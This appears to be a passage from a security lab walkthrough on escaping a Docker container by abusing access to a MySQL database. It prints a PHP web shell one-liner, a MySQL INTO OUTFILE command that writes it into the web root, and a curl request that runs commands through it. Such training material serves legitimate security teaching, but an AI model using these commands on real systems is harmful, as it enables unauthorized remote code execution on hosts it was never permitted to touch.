Now that you have identified that you are in a container and have performed all the information gathering and situational awareness you can, you can escape the container by exploiting the remote database.  

There are several ways to escape a container, all typically stemming from misconfigurations of the container from services or access controls.  

For more information about container best practices and docker security, check out this OWASP cheat-sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html).  

A method that's not quite as common is Exploitation. Exploits to escape Containers aren't as common and typically rely on abusing a process running on the host machine. Exploits usually require some level of user interaction, for example, [CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/). It can also be beneficial to use a container enumeration script such as DEEPCE, [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce).  

Since we gained access to a remote database, we can utilize it to gain command execution and escape the container from MySQL.  

The basic methodology for exploiting MySQL can be found below.  

- Access the remote database using administrator credentials
    
- Create a new table in the main database
    
- Inject PHP code to gain command execution
    
    Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`  
    
- Drop table contents onto a file the user can access  
    
- Execute and obtain RCE on the host.
    

Looking at the above exploit may seem complicated, but we can break it down further and provide more context to make it simpler.  

We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.  

Command used: `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`

Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.  

Example usage: `curl 127.0.0.1:8080/shell.php?cmd=whoami`

---
# Your job
